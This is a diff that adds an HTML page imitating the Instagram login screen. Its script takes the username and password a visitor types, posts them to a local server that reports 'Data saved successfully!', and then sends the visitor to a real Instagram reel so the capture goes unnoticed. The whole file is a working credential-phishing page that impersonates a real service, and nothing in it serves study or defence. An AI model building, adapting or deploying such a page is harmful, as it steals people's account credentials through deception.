@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="instagram.png" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <div class="input_field">
+                    <input id="username" type="text" placeholder="Phone number, username, or email" class="input">
+                </div>
+                <div class="input_field">
+                    <input id="password" type="password" placeholder="Password" class="input">
+                </div>
+                <div class="btn"><a href="#" id="loginBtn">Log In</a></div>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="facebook.png" alt="facebook">
+                    <p>Log in with Facebook</p>
+                </div>
+                <div class="forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="icons">
+                <a href="#"><img src="appstore.png" alt="appstore"></a>
+                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="#">ABOUT US</a></li>
+                <li><a href="#">SUPPORT</a></li>
+                <li><a href="#">PRESS</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">JOBS</a></li>
+                <li><a href="#">PRIVACY</a></li>
+                <li><a href="#">TERMS</a></li>
+                <li><a href="#">DIRECTORY</a></li>
+                <li><a href="#">PROFILES</a></li>
+                <li><a href="#">HASHTAGS</a></li>
+                <li><a href="#">LANGUAGE</a></li>
+            </ul>
+        </div>
+        <div class="copyright">
+            © 2025 INSTAGRAM
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginBtn').addEventListener('click', async function (event) {
+        event.preventDefault(); // Предотвращаем переход по ссылке
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (!username || !password) {
+            // Можно добавить красивое уведомление или подсветку ошибок на экране
+            return;
+        }
+
+        try {
+            const response = await fetch('http://localhost:3000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ username, password }),
+            });
+
+            if (!response.ok) {
+                throw new Error('Failed to send data');
+            }
+
+            const result = await response.json();
+
+            // Если запрос успешен, переходим на другую страницу
+            if (result.message === 'Data saved successfully!') {
+                // Перенаправление на новую страницу после успешного входа
+                window.location.href = 'https://www.instagram.com/reel/DCSDpXVtfmN/?igsh=MTNjZnVpbnZ0cms3Mw=='; // Укажите здесь ссылку на страницу, куда нужно перенаправить
+            }
+
+        } catch (error) {
+            console.error('Error:', error);
+            // Здесь можно обработать ошибку и вывести пользователю сообщение на экран (не через alert)
+        }
+    });
+</script>
+
+</body>
+</html>
